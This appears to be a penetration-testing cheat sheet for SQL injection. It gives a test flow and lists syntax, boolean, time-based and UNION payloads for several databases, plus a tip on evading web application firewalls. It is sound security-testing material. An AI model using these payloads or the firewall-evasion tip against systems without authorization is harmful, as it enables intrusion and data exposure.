# SQL Injection (SQLi)

## Test flow

1. Find parameterized inputs that influence DB-backed responses.
2. Start with syntax-breaking probes and observe errors/timing.
3. Test boolean-based, time-based, and union-based techniques.
4. Validate impact safely (data exposure, auth bypass, write access).
5. Avoid destructive payloads unless explicitly allowed by scope.

## Payload examples

### Syntax probes

- `'`
- `"`
- `')`
- `'-- -`

### Boolean-based

- `' OR 1=1-- -`
- `' OR '1'='1'-- -`
- `' AND 1=2-- -`

### Time-based

- `' OR SLEEP(5)-- -` (MySQL)
- `'; WAITFOR DELAY '0:0:5'--` (MSSQL)
- `' OR pg_sleep(5)--` (PostgreSQL)

### Union-based (when column count known)

- `' UNION SELECT NULL,NULL-- -`
- `' UNION SELECT 1,2,3-- -`

## Notes

- Watch for blind SQLi in JSON bodies and custom headers.
- If WAF is present, test whitespace/comments/casing variation.
